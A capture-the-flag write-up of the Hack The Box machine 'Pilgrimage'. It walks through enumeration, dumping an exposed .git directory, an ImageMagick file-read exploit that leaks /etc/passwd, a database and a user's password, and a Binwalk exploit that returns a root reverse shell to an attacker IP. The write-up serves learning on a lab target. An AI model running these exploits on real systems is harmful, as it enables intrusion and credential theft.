# Pilgrimage

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.29.28
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 16:31 +08
Warning: 10.129.29.28 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.29.28
Host is up (0.17s latency).
Not shown: 60710 closed tcp ports (conn-refused), 4823 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have to add `pilgrimage.htb` to our `/etc/hosts` file to view the web application.&#x20;

### Image Shrinker --> .git

The website offers a service to shrink images.

<figure><img src="../../.gitbook/assets/image (1717).png" alt=""><figcaption></figcaption></figure>

If we upload an image, we would get back a URL:

<figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

Interesting! This image is probably being passed somewhere into a command line instance. Anyways, before going that route, I did a directory and subdomain enumeration first using `gobuster` and `wfuzz`.&#x20;

A few directories were picked up by the more popular wordlists, but all led to nothing much. I ran one with the `dirsearch.txt` wordlist, and found that a `.git` directory exists on the machine:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -u http://pilgrimage.htb -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/06/25 16:38:52 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 7621]
/.git/config          (Status: 200) [Size: 92]
```

We can download this entire directory using `git-dumper`:

```
$ ./git_dumper.py http://pilgrimage.htb/ /home/kali/htb/season2/pilgrimage
```

This tool also checks out for us, and we get the source code of the website:

```
$ ls    
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```

### Image Magick --> LFI

One of the files is the `magick` binary, which is probably referring to Image Magick. Running it with the `--version` flag reveals that this is using an oudated version of it:

```
$ ./magick --version                                                            
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

This version has an LFI vulnerability that can be found on ExploitDB:

{% embed url="https://www.exploit-db.com/exploits/51261" %}

The `login.php` file also has some interesting stuff, showing us how the login authentication works and where the database file is:

```php
$ cat login.php 
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));

  if($stmt->fetchAll()) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /login.php?message=Login failed&status=fail");
  }
}
```

The exploit path would be to get an LFI and download the entire database to find credentials. The ExploitDB PoC brings us to this repository:

{% embed url="https://github.com/voidz0r/CVE-2022-44268" %}

I cloned it and ran this as a first test:

```
cargo run "/etc/passwd" 
```

Afterwards, we can upload the `image.png` file to the website and download it again. When we run `identify` on it, it would some hex stuff appended at the end:

```
$ identify -verbose ~/Downloads/64980052771c0.png
<TRUNCATED>
    png:text: 4 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2023-06-25T08:52:34Z
    Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

    signature: d02a8da86fec6ef80c209c8437c76cf8fbecb6528cd7ba95ef93eecc52a171c7
```

If we convert this to text, we would get the `/etc/passwd` file, meaning it worked:

<figure><img src="../../.gitbook/assets/image (1392).png" alt=""><figcaption></figcaption></figure>

Now we can replace the file with `/var/db/pilgrimage`. This would give us a humongous hex output, and after removing the irrelevant parts, we can convert it using `xxd` to get a SQLite file.&#x20;

{% code overflow="wrap" %}
```
$ cat output| xxd -r -p > db
$ file db
db: SQLite 3.x database, last written using SQLite version 3034001, file counter 69, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 69
```
{% endcode %}

We can use `sqlite3` to view the file and find some credentials:

```
sqlite> SELECT * from users;
emily|abigchonkyboi123
```

Then, we can `ssh` as the user `emily`.

<figure><img src="../../.gitbook/assets/image (990).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Pspy64 --> Binwalk RCE

Running `pspy64` would show this process:

```
2023/06/25 19:03:22 CMD: UID=0    PID=717    | /bin/bash /usr/sbin/malwarescan.sh 
```

Here's the contents of this script:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

This uses `inotifywait` to wait for files present in the `/shrunk` directory (which is where images uploaded are stored), and then it uses `binwalk` on them to make sure that there's no hidden stuff within it.&#x20;

We can enumerate the version of `binwalk` being used:

```
emily@pilgrimage:~$ binwalk --help

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

There are public RCE exploits for this particular version:

{% embed url="https://vulners.com/packetstorm/PACKETSTORM:171724" %}

We can use this script to embed a payload within an empty image (run `touch sample.png`).&#x20;

```
$ python3 pe_rce.py sample.png 10.10.14.86 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
```

Afterwards, we can download this file to the `/var/www/pilgrimage.htb/shrunk` folder as anything. If you monitor `pspy64` output, this would cause the `malwarescan.sh` script to be run, and our listener port would have a reverse shell!

<figure><img src="../../.gitbook/assets/image (2697).png" alt=""><figcaption></figcaption></figure>

Rooted!
